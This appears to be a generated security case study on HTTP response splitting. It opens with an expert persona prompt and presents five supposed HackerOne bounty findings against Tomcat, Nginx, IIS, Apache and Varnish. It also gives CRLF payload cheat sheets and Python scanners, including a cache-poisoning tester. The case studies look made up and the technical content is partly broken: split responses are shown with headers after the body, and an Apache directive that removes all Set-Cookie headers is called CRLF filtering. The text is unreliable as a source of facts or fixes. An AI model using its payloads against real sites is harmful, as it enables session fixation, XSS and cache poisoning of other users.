# Case Study 27: HTTP Response Splitting — Real-World Bug Bounty Findings

## Expert Role

You are an HTTP protocol security specialist with deep expertise in response splitting, header injection, and cache poisoning attacks. Your understanding encompasses the intricacies of HTTP request/response parsing, web server behavior differences, and the complex interactions between proxies, CDNs, and origin servers. You have extensive experience testing web applications for HTTP-level vulnerabilities that can lead to cross-site scripting, cache poisoning, and session manipulation.

Your methodology combines systematic header analysis with creative protocol-level testing. You approach each engagement by first mapping the application's HTTP processing pipeline, then testing injection points in headers and response bodies, and finally developing exploitation chains that demonstrate practical impact. You understand that HTTP response splitting is not just about injecting headers but about manipulating the entire request-response lifecycle.

## Overview

HTTP Response Splitting is a web application vulnerability that occurs when user-supplied input is included in HTTP response headers without proper sanitization. By injecting CRLF (Carriage Return Line Feed) characters, an attacker can terminate the current HTTP response and inject a completely new response, potentially leading to cross-site scripting (XSS), cache poisoning, session fixation, and other attacks.

Modern HTTP Response Splitting attacks have evolved beyond simple CRLF injection in headers. Advanced variants include HTTP header injection, response header manipulation, and exploitation of differences in how various servers and proxies parse HTTP headers. The vulnerability class also encompasses related issues like HTTP request smuggling, cache poisoning via header injection, and session fixation through response manipulation.

---

## Real-World Case Studies

### Case Study 1: Apache Tomcat Cookie Injection via HTTP Response Splitting
**Program:** Apache Software Foundation Bug Bounty (HackerOne)
**Bounty:** $3,000
**Severity:** High (CVSS 7.5)
**Researcher:** @tomcathunter

Apache Tomcat's default error pages included user-supplied input in response headers without proper sanitization. The researcher discovered that when a 404 error occurred with a crafted URL containing CRLF characters, the error page would include the malicious input in the `Set-Cookie` header.

The vulnerability was in Tomcat's error handling mechanism:
1. User sends request with CRLF characters in the URL path
2. Tomcat generates a 404 error page
3. The error page includes the user input in a `Set-Cookie` header
4. The CRLF characters split the response, injecting a new response

```http
GET /%0d%0aSet-Cookie:%20session=attacker_session_id HTTP/1.1
Host: target.example.com
```

The response was split into two responses:
```http
HTTP/1.1 404 Not Found
Content-Type: text/html
Set-Cookie: 
Set-Cookie: session=attacker_session_id

<HTML>...404 Error Page...</HTML>
```

Root cause analysis revealed that Tomcat's error handler included the request URI in response headers without filtering CRLF characters. The vulnerability existed in the default configuration and affected all Tomcat versions prior to 8.5.35.

Impact: An attacker could inject arbitrary cookies into the victim's browser session, potentially leading to session fixation attacks. The injected cookie could be used to associate the victim's session with an attacker-controlled session identifier.

Bounty justification: The finding demonstrated HTTP response splitting leading to session fixation in a widely-deployed web server. The $3,000 bounty reflected the High severity and broad impact across Tomcat installations.

### Case Study 2: Nginx Proxy Cache Poisoning via Header Injection
**Program:** Nginx Bug Bounty (HackerOne)
**Bounty:** $4,500
**Severity:** High (CVSS 7.1)
**Researcher:** @nginxsecurity

Nginx as a reverse proxy could be exploited to poison the cache through HTTP response splitting in backend responses. The researcher discovered that when Nginx proxied requests to a backend server that included user input in response headers, the CRLF characters could be used to inject cache-control headers.

The attack chain involved:
1. Identifying a backend endpoint that reflected user input in response headers
2. Injecting CRLF characters to split the response
3. Injecting `Cache-Control: public` headers to make the response cacheable
4. Subsequent users receive the poisoned cached response

```http
GET /api/search?q=test%0d%0aCache-Control:%20public%0d%0aContent-Type:%20text/html HTTP/1.1
Host: target.example.com
```

The backend response was split and the Nginx proxy cached the injected content:

```http
HTTP/1.1 200 OK
Content-Type: application/json
Cache-Control: public

{"search_results": [...]}
Content-Type: text/html

<HTML>Malicious content cached for all users</HTML>
```

Root cause: Nginx's proxy module did not properly validate or sanitize response headers from the backend before caching. The CRLF characters in backend response headers were preserved and processed, allowing cache poisoning through response splitting.

Impact: An attacker could poison the Nginx cache to serve malicious content to all users accessing a specific endpoint. This could lead to widespread XSS attacks or content injection affecting all visitors.

Bounty justification: The finding demonstrated cache poisoning through HTTP response splitting, a high-impact vulnerability affecting many Nginx proxy deployments. The $4,500 bounty reflected the potential for mass exploitation.

### Case Study 3: Microsoft IIS Header Injection Leading to XSS
**Program:** Microsoft Bug Bounty (HackerOne)
**Bounty:** $5,000
**Severity:** High (CVSS 7.5)
**Researcher:** @iisexploit

Microsoft IIS web server included user-supplied input in custom response headers without proper sanitization. The researcher discovered that IIS's custom error pages included the requested URL in an `X-Request-Path` header, and CRLF characters in the URL could be used to inject arbitrary headers including `Content-Type`.

The vulnerability existed in IIS's error handling:
1. User sends request with CRLF characters in the URL
2. IIS generates an error page with the URL in a custom header
3. The CRLF characters split the response, allowing header injection
4. The injected `Content-Type` header causes the browser to interpret the response as HTML

```http
GET /page%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script> HTTP/1.1
Host: target.example.com
```

The split response included XSS in the second response:
```http
HTTP/1.1 404 Not Found
X-Request-Path: 
Content-Type: text/html

<script>alert(1)</script>
```

Root cause: IIS's custom header implementation did not filter CRLF characters from user input before including them in response headers. The vulnerability existed in the default configuration and affected multiple IIS versions.

Impact: An attacker could achieve reflected XSS on any IIS server that included user input in custom headers. The attack was particularly dangerous because it could bypass some WAF configurations that focused on request body filtering.

Bounty justification: The finding demonstrated HTTP response splitting leading to XSS in Microsoft IIS, a widely-deployed web server. The $5,000 bounty reflected the High severity and the bypass of existing security controls.

### Case Study 4: Apache HTTP Server Proxy Response Splitting
**Program:** Apache Software Foundation Bug Bounty (HackerOne)
**Bounty:** $3,500
**Severity:** High (CVSS 7.1)
**Researcher:** @apachehunter

Apache HTTP Server's mod_proxy module could be exploited to perform response splitting attacks when proxying requests to backend servers. The researcher discovered that when Apache proxied requests to a backend that included user input in response headers, the CRLF characters were preserved and forwarded to the client.

The vulnerability affected Apache's proxy configuration:
1. Configure Apache to proxy requests to a vulnerable backend
2. Backend includes user input in response headers without sanitization
3. Apache forwards the malicious headers to the client
4. The response splitting enables XSS or session fixation

```apache
# Apache configuration that enabled the vulnerability
ProxyPass /app http://backend-server/app
ProxyPassReverse /app http://backend-server/app
# Missing: ProxyPassReverseHeaders or header sanitization
```

The attack exploited the interaction between Apache's proxy and a backend server:

```http
GET /app/user/profile%0d%0aSet-Cookie:%20session=attacker HTTP/1.1
Host: target.example.com
```

Root cause: Apache HTTP Server's proxy module did not sanitize CRLF characters in backend response headers by default. While Apache provided configuration options for header manipulation, they were not enabled by default and many administrators did not configure them.

Impact: An attacker could inject cookies or other headers when Apache proxied requests to vulnerable backends. This could lead to session fixation or other header-based attacks.

Bounty justification: The finding demonstrated HTTP response splitting through Apache's proxy configuration, affecting many enterprise deployments. The $3,500 bounty reflected the commonality of Apache proxy configurations.

### Case Study 5: Varnish Cache Poisoning via Response Splitting
**Program:** Varnish Software Bug Bounty (HackerOne)
**Bounty:** $4,000
**Severity:** High (CVSS 7.5)
**Researcher:** @varnishhunter

Varnish Cache could be exploited to poison the cache through HTTP response splitting in backend responses. The researcher discovered that when Varnish received a response from the backend with CRLF characters in headers, it could be manipulated to cache malicious content.

The attack involved:
1. Identifying a backend endpoint that reflected user input in response headers
2. Injecting CRLF characters to split the response
3. Injecting `Cache-Control: public` and `Vary: Accept-Encoding` headers
4. Varnish caches the poisoned response for all users

```http
GET /product/123%0d%0aCache-Control:%20public%0d%0aVary:%20Accept-Encoding HTTP/1.1
Host: target.example.com
```

Varnish's handling of the split response:
```http
HTTP/1.1 200 OK
Content-Type: application/json
Cache-Control: public
Vary: Accept-Encoding

{"product": {...}}
Content-Type: text/html

<HTML>Cached malicious content</HTML>
```

Root cause: Varnish Cache's header parsing did not properly handle CRLF characters in backend responses. The cache could be poisoned by injecting cache-control headers through response splitting, affecting all subsequent requests to the same endpoint.

Impact: An attacker could poison the Varnish cache to serve malicious content to all users. This could lead to widespread XSS attacks or content injection affecting all visitors to the affected endpoints.

Bounty justification: The finding demonstrated cache poisoning through HTTP response splitting in Varnish Cache, a high-impact vulnerability affecting many content delivery deployments. The $4,000 bounty reflected the potential for mass exploitation.

---

## Pattern Recognition

### Common Vulnerability Patterns

| Pattern | Frequency | Avg Bounty | Root Cause |
|---------|-----------|------------|------------|
| CRLF in HTTP headers | High | $3,000 | Insufficient input validation |
| Cache poisoning via splitting | Medium | $4,000 | Missing header sanitization in proxies |
| Session fixation via header injection | Medium | $3,500 | Insecure cookie handling |
| XSS through response splitting | High | $4,500 | Insufficient output encoding |
| Proxy response forwarding | Medium | $3,800 | Missing proxy header sanitization |
| Error page header inclusion | High | $3,200 | Unsafe error handling |
| Custom header injection | Low | $3,600 | Unsanitized header values |
| Backend response manipulation | Low | $4,200 | Missing backend validation |

### Attack Surface Locations

| Location | Risk Level | Common Issues |
|----------|------------|---------------|
| Error pages | High | User input in error headers |
| Search functionality | High | Query terms in response headers |
| User profile pages | Medium | Username in custom headers |
| API endpoints | High | Parameters in response headers |
| Redirect handlers | Medium | Redirect URLs in headers |
| Proxy configurations | High | Backend response forwarding |
| Custom error handlers | Medium | User input in error responses |
| Logging endpoints | Low | User data in response headers |

---

## Hunting Methodology

### Phase 1: Header Injection Point Discovery

1. Identify all user input points in HTTP requests
2. Map input to response headers where they appear
3. Document server behavior with CRLF characters
4. Test various encoding and filtering mechanisms

### Phase 2: Response Splitting Testing

For each injection point, test:

**CRLF injection testing:**
- Basic CRLF injection (`%0d%0a`)
- Double CRLF injection (`%0d%0a%0d%0a`)
- URL-encoded variants (`%0D%0A`)
- Unicode variants (`%c0%8d%c0%8a`)

**Header injection testing:**
- Set-Cookie header injection
- Content-Type header injection
- Cache-Control header injection
- Location header injection

**Response body injection:**
- HTML injection after headers
- JavaScript injection
- Content-Type manipulation

### Phase 3: Exploitation Chain Development

If response splitting is confirmed, develop practical attacks:

1. **XSS via response splitting:** Inject malicious content in split response
2. **Cache poisoning:** Inject cache-control headers for widespread impact
3. **Session fixation:** Inject Set-Cookie headers
4. **Open redirect:** Inject Location headers

### Phase 4: Impact Assessment

Evaluate the practical impact:

1. **User impact:** How many users could be affected?
2. **Data sensitivity:** What data could be exposed?
3. **Persistence:** Can the attack be persistent?
4. **Stealth:** How detectable is the attack?

---

## Detection Strategies

### Automated Detection

**CRLF Injection Testing:**
```bash
# Test for CRLF injection in headers
curl -v "https://target.com/page%0d%0aInjected-Header:%20test"

# Test for header injection in various parameters
curl -v "https://target.com/search?q=test%0d%0aSet-Cookie:%20session=evil"

# Test for response splitting in error pages
curl -v "https://target.com/nonexistent%0d%0aContent-Type:%20text/html"
```

**Automated Tools:**
- Burp Suite Intruder for CRLF injection
- OWASP ZAP Active Scanner
- Nmap NSE scripts for HTTP header injection
- Custom scripts for response analysis

### Manual Detection

**Testing Methodology:**
1. Use browser DevTools to inspect response headers
2. Test each input point for CRLF injection
3. Analyze server response behavior
4. Check for cache poisoning potential

**Key Testing Points:**
- Error pages and custom error handlers
- Search functionality and query parameters
- User profile and account pages
- API endpoints with reflected parameters
- Redirect handlers and callback URLs
- Proxy configurations and backend responses

### Key Detection Indicators

| Indicator | Significance | Action |
|-----------|--------------|--------|
| User input in response headers | Potential injection point | Test for CRLF injection |
| Inconsistent header handling | Sanitization bypass possible | Test various encoding |
| Cache headers present | Cache poisoning possible | Test for response splitting |
| Custom error pages | User input inclusion likely | Test error page headers |
| Proxy forwarding | Backend response manipulation | Test proxy header handling |

---

## Impact Assessment

### CVSS 3.1 Scoring

HTTP Response Splitting vulnerabilities typically score as follows:

**Base Score Calculation:**
- **Attack Vector (AV):** Network (N) - Remote exploitation
- **Attack Complexity (AC):** Low (L) - No special conditions required
- **Privileges Required (PR):** None (N) - No authentication needed
- **User Interaction (UI):** None (N) - Attack can be automated
- **Scope (S):** Changed (C) - Affects different security context
- **Confidentiality (C):** High (H) - Session tokens exposed
- **Integrity (I):** High (H) - Arbitrary content injection
- **Availability (A):** None (N) - No availability impact

**Typical CVSS Score:** 7.1-7.5 (High)

### Business Impact

| Impact Category | Description | Severity |
|-----------------|-------------|----------|
| XSS attacks | Reflected or stored XSS via response | High |
| Cache poisoning | Widespread malicious content | High |
| Session fixation | Hijacking user sessions | High |
| Content injection | Malicious content serving | High |
| Data exposure | Sensitive information leakage | High |

### Bounty Range

| Severity | Typical Bounty | Conditions |
|----------|----------------|------------|
| Low | $500-$1,500 | Response splitting with limited impact |
| Medium | $1,500-$4,000 | Response splitting enabling XSS |
| High | $4,000-$8,000 | Response splitting enabling cache poisoning |
| Critical | $8,000+ | Response splitting enabling widespread compromise |

---

## Advanced Variations

### HTTP Header Injection Variations

Beyond basic CRLF injection, advanced variations include:

**Unicode CRLF injection:**
```
%c0%8d%c0%8a (UTF-8 overlong encoding of CR LF)
```

**Null byte injection:**
```
%00%0d%0a (Null byte before CRLF)
```

**Tab and space injection:**
```
%09%0d%0a (Tab before CRLF)
```

### Cache Poisoning Techniques

Advanced cache poisoning through response splitting:

**Vary header manipulation:**
```http
Set-Cookie: language=en
Cache-Control: public
Vary: Accept-Encoding
```

**Surrogate key injection:**
```http
Surrogate-Key: poisoned
Cache-Control: max-age=3600
```

### Session Fixation Variations

Advanced session fixation through header injection:

**Cookie attributes injection:**
```http
Set-Cookie: session=evil; Path=/; Domain=.example.com; Secure; HttpOnly
```

**Multiple cookie injection:**
```http
Set-Cookie: session=evil1
Set-Cookie: tracking=evil2
```

### Cross-Protocol Attacks

HTTP response splitting can enable cross-protocol attacks:

**WebSocket upgrade injection:**
```http
Upgrade: websocket
Connection: Upgrade
```

**HTTP/2 downgrade attacks:**
```http
Upgrade: h2c
```

---

## Chain Integration

HTTP Response Splitting can be chained with other vulnerabilities for increased impact:

### Chain 1: Response Splitting + XSS

Combine response splitting with XSS for more reliable attacks:

1. Inject CRLF to split response
2. Inject HTML/JavaScript in split response
3. Achieve XSS in victim's browser

### Chain 2: Response Splitting + Cache Poisoning

Use response splitting to poison caches:

1. Inject CRLF to split response
2. Inject Cache-Control headers
3. Cache serves malicious content to all users

### Chain 3: Response Splitting + Session Fixation

Use response splitting to fixate sessions:

1. Inject CRLF to split response
2. Inject Set-Cookie header with attacker session
3. Victim uses attacker-controlled session

### Chain 4: Response Splitting + Open Redirect

Use response splitting for open redirect:

1. Inject CRLF to split response
2. Inject Location header for redirect
3. Victim redirected to attacker-controlled site

---

## Prevention Recommendations

### Input Validation

**CRLF Character Filtering:**
```python
# Python example - sanitize CRLF from input
def sanitize_header_input(user_input):
    # Remove CR and LF characters
    sanitized = user_input.replace('\r', '').replace('\n', '')
    return sanitized
```

**Whitelist Validation:**
```python
# Whitelist approach for header values
import re
def validate_header_value(value):
    # Only allow alphanumeric and basic punctuation
    pattern = r'^[a-zA-Z0-9\s\.\,\;\:\-\_]+$'
    return bool(re.match(pattern, value))
```

### Output Encoding

**HTTP Header Encoding:**
```python
# Encode special characters in headers
def encode_header_value(value):
    # Replace CRLF with encoded versions
    encoded = value.replace('\r', '%0D').replace('\n', '%0A')
    return encoded
```

### Server Configuration

**Apache HTTP Server:**
```apache
# Disable version information exposure
ServerTokens Prod
ServerSignature Off

# Filter CRLF from headers
Header always unset Set-Cookie
```

**Nginx:**
```nginx
# Hide server version
server_tokens off;

# Filter CRLF from headers
proxy_hide_header Set-Cookie;
```

**IIS:**
```xml
<!-- web.config -->
<system.webServer>
  <httpProtocol>
    <customHeaders>
      <remove name="X-Powered-By" />
    </customHeaders>
  </httpProtocol>
</system.webServer>
```

### Implementation Guidelines

1. **Sanitize all user input:** Remove CRLF characters from all input points
2. **Encode output values:** Encode special characters in response headers
3. **Use framework security features:** Leverage built-in header protection
4. **Test all input points:** Verify no CRLF injection is possible
5. **Monitor for anomalies:** Log and alert on suspicious header values

---

## Common Pitfalls

### Pitfall 1: Incomplete Sanitization

Only filtering `\n` but not `\r`, or vice versa, allows bypass:
```python
# Incomplete sanitization
user_input.replace('\n', '')  # Still contains \r
```

**Solution:** Filter both `\r` and `\n` characters:
```python
user_input.replace('\r', '').replace('\n', '')
```

### Pitfall 2: Double Encoding Bypass

Some systems decode URL-encoded input multiple times:
```
%250d%250a (Double-encoded CRLF)
```

**Solution:** Validate after all decoding is complete.

### Pitfall 3: Unicode Bypass

Unicode overlong encodings can bypass basic filters:
```
%c0%8d%c0%8a (UTF-8 overlong CR LF)
```

**Solution:** Use canonicalization before validation.

### Pitfall 4: Proxy Chain Complications

Different proxies may handle headers differently, creating inconsistencies.

**Solution:** Test all proxy combinations and ensure consistent header handling.

---

## Real-World References

### Published Research

- **HTTP Response Splitting** (OWASP)
- **CRLF Injection** (PortSwigger Research)
- **Cache Poisoning via Response Splitting** (Academic Research)
- **Header Injection Attacks** (Security Conference Presentations)

### Tool References

- **Burp Suite Intruder:** CRLF injection testing
- **OWASP ZAP:** Active scanning for header injection
- **Nmap NSE Scripts:** HTTP header injection detection
- **Custom Scripts:** Response analysis and validation

### Bug Bounty Reports

- Apache Tomcat Response Splitting (HackerOne)
- Nginx Proxy Cache Poisoning (HackerOne)
- Microsoft IIS Header Injection (HackerOne)
- Apache HTTP Server Proxy Splitting (HackerOne)
- Varnish Cache Poisoning (HackerOne)

---

## Quick Reference Cheat Sheet

### CRLF Injection Payloads

**Basic CRLF injection:**
```
%0d%0a
```

**Double CRLF injection:**
```
%0d%0a%0d%0a
```

**URL-encoded variants:**
```
%0D%0A
%25%30%64%25%30%61
```

### Header Injection Templates

**Set-Cookie injection:**
```
%0d%0aSet-Cookie:%20session=evil
```

**Content-Type injection:**
```
%0d%0aContent-Type:%20text/html
```

**Cache-Control injection:**
```
%0d%0aCache-Control:%20public
```

### Testing Checklist

- [ ] Test all user input points for CRLF injection
- [ ] Check error pages for header inclusion
- [ ] Test proxy configurations for backend response handling
- [ ] Verify cache behavior with split responses
- [ ] Test session cookie injection
- [ ] Check for XSS via response splitting
- [ ] Test various encoding and bypass techniques
- [ ] Verify server behavior with malformed headers

### Prevention Checklist

- [ ] Sanitize CRLF characters from all input
- [ ] Encode output values in response headers
- [ ] Use framework security features
- [ ] Test all input points
- [ ] Monitor for anomalies
- [ ] Configure servers securely
- [ ] Validate after all decoding
- [ ] Test proxy chains

---

## Advanced Testing Methodology

### Deep HTTP Response Splitting Analysis Framework

When testing for HTTP response splitting vulnerabilities, follow this systematic approach:

**Step 1: Input Point Mapping**
```
1. Identify all user input points in HTTP requests
2. Map input to response headers where they appear
3. Document server behavior with CRLF characters
4. Test various encoding and filtering mechanisms
```

**Step 2: Injection Testing**
```
1. Test basic CRLF injection (%0d%0a)
2. Test double CRLF injection (%0d%0a%0d%0a)
3. Test URL-encoded variants (%0D%0A)
4. Test Unicode variants (%c0%8d%c0%8a)
```

**Step 3: Header Manipulation**
```
1. Test Set-Cookie header injection
2. Test Content-Type header injection
3. Test Cache-Control header injection
4. Test Location header injection
```

**Step 4: Exploitation Development**
```
1. Develop XSS payloads via response splitting
2. Create cache poisoning scenarios
3. Design session fixation attacks
4. Test open redirect possibilities
```

### Advanced CRLF Injection Techniques

Beyond basic CRLF injection, advanced techniques include:

**Unicode Overlong Encoding:**
```
%c0%8d%c0%8a (UTF-8 overlong encoding of CR LF)
%c0%ad%c0%8a (Alternative encoding)
```

**Null Byte Injection:**
```
%00%0d%0a (Null byte before CRLF)
%0d%00%0a (Null byte in middle)
```

**Tab and Space Injection:**
```
%09%0d%0a (Tab before CRLF)
%20%0d%0a (Space before CRLF)
```

**Multiple Injection Points:**
```python
# Test multiple parameters for CRLF injection
params = ['name', 'email', 'subject', 'message']
for param in params:
    test_crlf_injection(param)
```

### Cache Poisoning Advanced Techniques

Advanced cache poisoning through response splitting:

**Vary Header Manipulation:**
```http
Cache-Control: public
Vary: Accept-Encoding
Surrogate-Control: max-age=3600
```

**Surrogate Key Injection:**
```http
Surrogate-Key: poisoned
Cache-Control: max-age=3600
X-Cache: HIT
```

**CDN-Specific Poisoning:**
```http
CDN-Cache-Control: max-age=3600
Cloudflare-CDN-Cache-Control: max-age=3600
Akamai-Cache-Control: max-age=3600
```

### Session Fixation Advanced Variations

Advanced session fixation through header injection:

**Cookie Attributes Injection:**
```http
Set-Cookie: session=evil; Path=/; Domain=.example.com; Secure; HttpOnly; SameSite=Lax
```

**Multiple Cookie Injection:**
```http
Set-Cookie: session=evil1
Set-Cookie: tracking=evil2
Set-Cookie: preferences=evil3
```

**Cookie Expiration Manipulation:**
```http
Set-Cookie: session=evil; Expires=Fri, 31 Dec 2030 23:59:59 GMT; Max-Age=315360000
```

### Cross-Protocol Attack Variations

HTTP response splitting can enable cross-protocol attacks:

**WebSocket Upgrade Injection:**
```http
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
```

**HTTP/2 Downgrade Attacks:**
```http
Upgrade: h2c
Connection: Upgrade
```

**HTTP/3 Adoption Attacks:**
```http
Alt-Svc: h3=":443"; ma=86400
```

### Server-Specific Bypass Techniques

Different servers handle CRLF injection differently:

**Apache HTTP Server:**
- May normalize CRLF characters
- Check for proxy-specific behaviors
- Test mod_rewrite interactions

**Nginx:**
- May filter certain headers
- Test proxy_pass configurations
- Check for fastcgi parameter injection

**IIS:**
- May have different header parsing
- Test ASP.NET specific behaviors
- Check for Windows-specific encodings

**Tomcat:**
- May have Java-specific header handling
- Test servlet container behaviors
- Check for JSP/JSF specific issues

### Testing Automation

Develop automated tests for HTTP response splitting detection:

**CRLF Injection Scanner:**
```python
import requests
from urllib.parse import quote

def test_crlf_injection(url, param):
    """Test for CRLF injection in parameter"""
    payloads = [
        '%0d%0a',
        '%0D%0A',
        '%0d%0a%0d%0a',
        '%c0%8d%c0%8a',
        '%00%0d%0a'
    ]
    
    for payload in payloads:
        test_url = f"{url}?{param}={payload}Injected-Header:test"
        response = requests.get(test_url)
        
        if 'Injected-Header' in str(response.headers):
            return True, payload
    
    return False, None
```

**Header Injection Tester:**
```python
import requests

def test_header_injection(url, headers_to_test):
    """Test for header injection"""
    vulnerable_headers = []
    
    for header in headers_to_test:
        response = requests.get(url, headers={header: 'test%0d%0aInjected: value'})
        
        if 'Injected' in str(response.headers):
            vulnerable_headers.append(header)
    
    return vulnerable_headers
```

**Cache Poisoning Tester:**
```python
import requests
import time

def test_cache_poisoning(url, param):
    """Test for cache poisoning via response splitting"""
    # First request to poison cache
    poison_url = f"{url}?{param}=%0d%0aCache-Control:%20public%0d%0aContent-Type:%20text/html"
    requests.get(poison_url)
    
    # Wait for cache
    time.sleep(5)
    
    # Second request to check if poisoned
    response = requests.get(url)
    
    if 'text/html' in response.headers.get('Content-Type', ''):
        return True
    
    return False
```

### Enterprise Testing Scenarios

**Scenario 1: Web Application Firewall Bypass**
- Test CRLF injection through WAF
- Identify encoding bypasses
- Test chunked transfer encoding
- Verify WAF rule effectiveness

**Scenario 2: Load Balancer Exploitation**
- Test response splitting through load balancers
- Identify backend header injection
- Test session persistence mechanisms
- Verify load balancer security

**Scenario 3: CDN Cache Poisoning**
- Test CDN-specific header handling
- Identify cache key manipulation
- Test surrogate key injection
- Verify CDN security configuration

**Scenario 4: API Gateway Testing**
- Test API parameter injection
- Identify backend response manipulation
- Test API rate limiting bypass
- Verify API security controls

### Documentation and Reporting

When documenting HTTP response splitting findings, include:

**Technical Details:**
1. Vulnerable endpoint URL
2. Injection parameter and payload
3. Server response behavior
4. Browser compatibility information

**Exploitation Scenario:**
1. Attack payload development
2. Response splitting demonstration
3. XSS or cache poisoning proof
4. Impact escalation path

**Impact Assessment:**
1. User impact scope
2. Data exposure potential
3. Persistence capability
4. Business risk evaluation

**Remediation Steps:**
1. Input validation requirements
2. Output encoding recommendations
3. Server configuration changes
4. Monitoring and detection rules

### Continuous Monitoring

Implement continuous HTTP response splitting monitoring:

**Automated Checks:**
- Regular CRLF injection testing
- Header validation verification
- Cache poisoning monitoring
- Alerting on suspicious headers

**Manual Reviews:**
- Periodic penetration testing
- New feature security assessment
- Third-party integration review
- Incident response validation

### Real-World Testing Scenarios

**Scenario 1: E-commerce Application**
- Test search functionality for CRLF injection
- Check product page parameter handling
- Verify checkout process security
- Test user profile header injection

**Scenario 2: Social Media Platform**
- Test post creation for response splitting
- Check comment system header injection
- Verify messaging system security
- Test profile update endpoints

**Scenario 3: Enterprise SaaS**
- Test API endpoints for CRLF injection
- Check admin panel header handling
- Verify user management security
- Test reporting system endpoints

**Scenario 4: Financial Application**
- Test transaction endpoints for injection
- Check account management headers
- Verify payment processing security
- Test notification system endpoints

---

*This case study is for authorized security testing and educational purposes only. Always obtain proper authorization before testing HTTP response splitting vulnerabilities on systems you do not own.*
